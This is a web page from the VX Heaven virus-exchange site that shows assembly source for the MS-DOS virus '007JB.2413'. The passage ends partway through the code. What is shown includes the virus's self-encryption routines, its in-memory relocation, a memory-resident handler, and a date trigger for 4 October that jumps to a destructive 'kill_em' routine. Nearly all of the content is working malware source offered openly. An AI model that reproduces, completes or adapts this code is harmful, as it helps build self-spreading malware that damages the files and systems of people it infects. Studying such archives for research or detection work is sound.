<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>007JB.2413 ver.1.01.2 Beta - Virus for MS-DOS written by 007JB (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, –∫–æ–º–ø—å—é—Ç–µ—Ä–Ω—ã–µ –≤–∏—Ä—É—Å—ã, –≤–∏—Ä—É—Å, –≤–∏—Ä–∏"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"0da799ba98e0c0f93497b61cae746ead6f368740-1498759686-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/src_view.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">–†—É—Å—Å–∫–∏–π</option><option selected="selected" value="en">English</option><option value="ua">–£–∫—Ä–∞—ó–Ω—Å—å–∫–∞</option><option value="de">Deutsch</option><option value="es">Espa√±ol</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>Source code of computer viruses</h1><h2>007JB.2413 ver.1.01.2 Beta</h2><p><em>Virus for MS-DOS</em></p><p><strong>007JB</strong><br/><small><a href="/src.php?author=007JB">Show all viruses by this author</a></small></p><small><a href="/src.php?info=007.zip">Description and download</a></small><br/><p>1998-06-00</p><h2>007.ASM</h2> [<a href="/src_view.php?file=007.zip">Index</a>] [<a href="/src_view.php?file=007.zip&amp;view=007.ASM&amp;highlight=off">Turn off syntax highlighting</a>] <hr/><pre class="asm" style="font-family:monospace;color: #000066; background-color: #cccbbb;">&nbsp;
<span style="color: black; font-style: italic;">;DEBUG           equ     TRUE</span>
&nbsp;
                        <span style="color: black; font-style: italic;">;ssssoooo</span>
cc_loader_ptr   <span style="color: #0000ff; font-weight: bold;">equ</span>      <span style="color: #ff0000;">007005E0h</span>
cc_video_ptr    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0AE000100h</span>
cc_shadow_ptr   <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0C6F00100h</span>
cc_temp_ptr     <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0BE000100h</span>
&nbsp;
file_id_offs    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">12h</span>
file_id         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #7f007f;">'07'</span>
&nbsp;
magic_i         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">829Ah</span>
magic_o         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">829Bh</span>
&nbsp;
o               <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #ff0000;">0</span><span style="color: black;">&#41;</span>
s               <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #ff0000;">2</span><span style="color: black;">&#41;</span>
&nbsp;
mve             macro   x<span style="color: #339933;">,</span> y
                <span style="color: #00007f; font-weight: bold;">push</span>    y
                <span style="color: #00007f; font-weight: bold;">pop</span>     x
                endm
&nbsp;
dta_struc       <span style="color: #0000ff; font-weight: bold;">struc</span>
                <span style="color: black; font-style: italic;">; internal</span>
dta_driveletter <span style="color: #0000ff; font-weight: bold;">db</span>      ?               <span style="color: black; font-style: italic;">; 0=A:</span>
dta_name8       <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">8</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>       <span style="color: black; font-style: italic;">;</span>
dta_ext3        <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">3</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>       <span style="color: black; font-style: italic;">;</span>
dta_searchattr  <span style="color: #0000ff; font-weight: bold;">db</span>      ?               <span style="color: black; font-style: italic;">;</span>
dta_direntrynum <span style="color: #0000ff; font-weight: bold;">dw</span>      ?               <span style="color: black; font-style: italic;">; 0=. 1=..</span>
dta_dircluster  <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
                <span style="color: #0000ff; font-weight: bold;">dd</span>      ?               <span style="color: black; font-style: italic;">; unused</span>
                <span style="color: black; font-style: italic;">; public</span>
dta_attr        <span style="color: #0000ff; font-weight: bold;">db</span>      ?               <span style="color: black; font-style: italic;">; 1=r 32=a 16=d 2=h 4=s 8=v</span>
dta_time        <span style="color: #0000ff; font-weight: bold;">dw</span>      ?               <span style="color: black; font-style: italic;">; ÁÁÁÁÁ¨¨¨ ¨¨¨·····</span>
dta_date        <span style="color: #0000ff; font-weight: bold;">dw</span>      ?               <span style="color: black; font-style: italic;">; £££££££¨ ¨¨¨§§§§§</span>
dta_size        <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
dta_name        <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">13</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>
                ends
&nbsp;
exe_struc       <span style="color: #0000ff; font-weight: bold;">struc</span>
exe_mz          <span style="color: #0000ff; font-weight: bold;">dw</span>      ?               <span style="color: black; font-style: italic;">; MZ/ZM</span>
exe_last512     <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_num512      <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_relnum      <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_headersize  <span style="color: #0000ff; font-weight: bold;">dw</span>      ?               <span style="color: black; font-style: italic;">; in PAR</span>
exe_minmem      <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_maxmem      <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_ss          <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_sp          <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_checksum    <span style="color: #0000ff; font-weight: bold;">dw</span>      ?               <span style="color: black; font-style: italic;">; 0</span>
exe_ip          <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_cs          <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_relofs      <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
exe_ovrnum      <span style="color: #0000ff; font-weight: bold;">dw</span>      ?               <span style="color: black; font-style: italic;">; 0</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">32</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>
exe_neptr       <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
                ends
&nbsp;
                model   <span style="color: #0000ff; font-weight: bold;">small</span>
                p386
                locals  __
                jumps
&nbsp;
<span style="color: #0000ff; font-weight: bold;">code</span>            <span style="color: #0000ff; font-weight: bold;">segment</span> <span style="color: #0000ff; font-weight: bold;">word</span> <span style="color: #0000ff; font-weight: bold;">public</span> <span style="color: #0000ff; font-weight: bold;">use16</span>
                assume  <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">code</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">code</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">code</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">code</span>
&nbsp;
                org     <span style="color: #ff0000;">100h</span>
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span>
c1_start<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    initialize
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'007JB.'</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      virsize <span style="color: #339933;">/</span> <span style="color: #ff0000;">1000</span> mod <span style="color: #ff0000;">10</span> <span style="color: #339933;">+</span> <span style="color: #7f007f;">'0'</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      virsize <span style="color: #339933;">/</span>  <span style="color: #ff0000;">100</span> mod <span style="color: #ff0000;">10</span> <span style="color: #339933;">+</span> <span style="color: #7f007f;">'0'</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      virsize <span style="color: #339933;">/</span>   <span style="color: #ff0000;">10</span> mod <span style="color: #ff0000;">10</span> <span style="color: #339933;">+</span> <span style="color: #7f007f;">'0'</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      virsize <span style="color: #339933;">/</span>    <span style="color: #ff0000;">1</span> mod <span style="color: #ff0000;">10</span> <span style="color: #339933;">+</span> <span style="color: #7f007f;">'0'</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">' virus  ver.1.01.2[Beta]  copyright (c) 1998 by 007JB'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'thanx to Z0MBiE/29A &amp; S.S.R.'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
&nbsp;
c1_size         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>c1_start
&nbsp;
com_start<span style="color: #339933;">:</span>      <span style="color: #00007f; font-weight: bold;">call</span>    code_unxor
&nbsp;
c2_start<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    antiweb
&nbsp;
                <span style="color: #00007f; font-weight: bold;">pusha</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    sux
&nbsp;
orig            <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">64</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>
orig_size       <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>orig
&nbsp;
sux<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">100h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> orig_size
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1234h</span>
start_ptr       <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1000h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">100h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> virsize
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">popa</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #ff0000;">0100h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">es</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    offset tsr
                retf
&nbsp;
c2_size         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>c2_start
&nbsp;
exe_start<span style="color: #339933;">:</span>      <span style="color: #00007f; font-weight: bold;">call</span>    code_unxor
&nbsp;
c3_start<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    antiweb
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">es</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_cs<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_ss<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    tsr
&nbsp;
                <span style="color: #00007f; font-weight: bold;">lss</span>     <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>save_sssp
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0eah</span>
save_ip         <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
save_cs         <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
&nbsp;
antiweb<span style="color: #339933;">:</span>        <span style="color: #00007f; font-weight: bold;">nop</span>
                <span style="color: #00007f; font-weight: bold;">nop</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
save_sssp       label   <span style="color: #0000ff; font-weight: bold;">dword</span>
save_sp         <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
save_ss         <span style="color: #0000ff; font-weight: bold;">dw</span>      ?
&nbsp;
dosver          <span style="color: #0000ff; font-weight: bold;">db</span>      ?
&nbsp;
c3_size         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>c3_start
&nbsp;
&nbsp;
code_unxor<span style="color: #339933;">:</span>     <span style="color: #00007f; font-weight: bold;">pusha</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1234h</span>
zero_ptr        <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">88h</span>
__1<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span>
                <span style="color: #00007f; font-weight: bold;">or</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">jz</span>      __1
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ah</span>
                <span style="color: #00007f; font-weight: bold;">cbw</span>
                <span style="color: #00007f; font-weight: bold;">ror</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> code_w_unxor<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: black;">&#93;</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    code_calldx
                <span style="color: #00007f; font-weight: bold;">popa</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
code_calldx<span style="color: #339933;">:</span>    <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> c1_start
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> c1_size
                <span style="color: #00007f; font-weight: bold;">call</span>    <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> c2_start
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> c2_size
                <span style="color: #00007f; font-weight: bold;">call</span>    <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> c3_start
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> c3_size
                <span style="color: #00007f; font-weight: bold;">call</span>    <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> c4_start
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> c4_size
                <span style="color: #00007f; font-weight: bold;">call</span>    <span style="color: #46aa03; font-weight: bold;">dx</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
code_w_unxor<span style="color: #339933;">:</span>   <span style="color: #00007f; font-weight: bold;">shr</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
__1<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1111h</span>
add_word        <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2222h</span>
xor_word        <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3333h</span>
sub_word        <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">loop</span>    __1
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
&nbsp;
c4_start<span style="color: #339933;">:</span>
&nbsp;
code_xor<span style="color: #339933;">:</span>       <span style="color: #00007f; font-weight: bold;">pusha</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> code_w_xor
                <span style="color: #00007f; font-weight: bold;">call</span>    code_calldx
                <span style="color: #00007f; font-weight: bold;">popa</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
code_w_xor<span style="color: #339933;">:</span>     <span style="color: #00007f; font-weight: bold;">shr</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> cryptedvir<span style="color: #339933;">-</span><span style="color: #0000ff; font-weight: bold;">start</span>
&nbsp;
__1<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> sub_word
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> xor_word
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> add_word
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">loop</span>    __1
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
tsr<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">pusha</span>                   <span style="color: black; font-style: italic;">; FAR</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ds</span> <span style="color: #46aa03; font-weight: bold;">es</span>
&nbsp;
                mve     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">cld</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2ah</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0A04h</span> <span style="color: black; font-style: italic;">; 4 oct.</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      kill_em
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> magic_i
